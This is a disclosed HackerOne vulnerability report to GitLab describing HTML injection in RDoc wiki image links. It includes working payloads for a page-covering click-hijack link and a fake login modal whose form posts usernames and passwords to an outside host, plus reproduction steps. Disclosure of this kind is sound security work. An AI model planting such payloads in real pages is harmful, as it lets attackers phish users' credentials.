# Cross-site Scripting (XSS) - Stored in RDoc wiki pages

## Report Details
- **Report ID**: 662287
- **URL**: https://hackerone.com/reports/662287
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-07-28T15:31:34.731Z
- **Disclosed**: 2019-12-16T09:02:35.750Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format `{<img src>}[link]`

For example it is possible to specify a `class` attribute when creating an image link:

```rdoc
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

will generate the following:

```html
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

This will place a link taking over the entire page and intercept any clicks, `atwho-view select2-drop-mask pika-select` are just some real classes that make the links position absolute with a high z-index.

The `target` attribute could also be set to `_blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing) is also possible.


Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:

```rdoc
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

Which produces the following dialog when viewing the page:
{F541421}


### Steps to reproduce

1. Create a wiki on gitlab
1. Add a new RDoc page with the above snippet
1. Save and wait for someone to click it


### Impact
An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.

### Examples

Example linking to a fake sign in form:
https://gitlab.com/wbowling/wiki/wikis/home

Example creating a modal form:
https://gitlab.com/wbowling/wiki/wikis/home2

### What is the current *bug* behavior?
When using an image link in RDoc the anchor tag attributes are not sanitized correctly.

### What is the expected *correct* behavior?
They should be correctly sanitized.

### Relevant logs and/or screenshots


### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.1
Revision:	f9abaa7d833
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Trick users into giving up their account details via a legitimate looking form on gitlab.com

## Attachments
- form.png
